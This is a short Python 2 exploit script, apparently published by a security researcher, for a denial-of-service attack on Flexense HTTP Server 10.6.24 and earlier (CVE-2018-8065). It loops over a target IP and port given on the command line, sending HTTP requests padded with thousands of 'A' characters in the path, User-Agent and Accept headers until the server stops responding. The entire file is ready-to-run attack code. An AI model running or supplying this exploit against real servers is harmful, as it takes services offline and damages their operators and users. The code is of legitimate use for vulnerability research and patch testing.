#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import sys
import random
import time


if len(sys.argv) < 2:
    print "[*] Usage: "+sys.argv[0]+" <ip> <port>"
    exit()

print """
#==============================================#
# Title: Flexense HTTP Server <= 10.6.24 DOS   #
# CVE:2018-8065                                #
# Author: Ege Balcı                            # 
# Contact: ege.balci[at]invictuseurope[dot]com #
#==============================================#

 """

sent = 0
o = 1

while True:

    payload = ""
    u = (['\\','|','/','-'])
    rnd = random.randrange(0,4)
    if o == 4:
	    o = 0

    payload = "GET /"+("A"*random.randrange(0,8000))+" HTTP/0.9\n"
    payload += "Host: 192.168.1.27\n"
    payload += "User-Agent: "+("A"*random.randrange(0,8000))+"\n"
    payload += "Accept: "+("A"*random.randrange(0,8000))+"\r\n\r\n"

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        connect = s.connect((sys.argv[1],int(sys.argv[2])))
        s.send(payload)
        s.close()    
        sys.stdout.flush()		
        sys.stdout.write("\r[{1}] Bombarding: {0}".format(sent,u[o]))
        sent += 1
        o +=  1
        time.sleep(float(0.005))
    except:
        print "\n[+] Server down !!"
        exit()
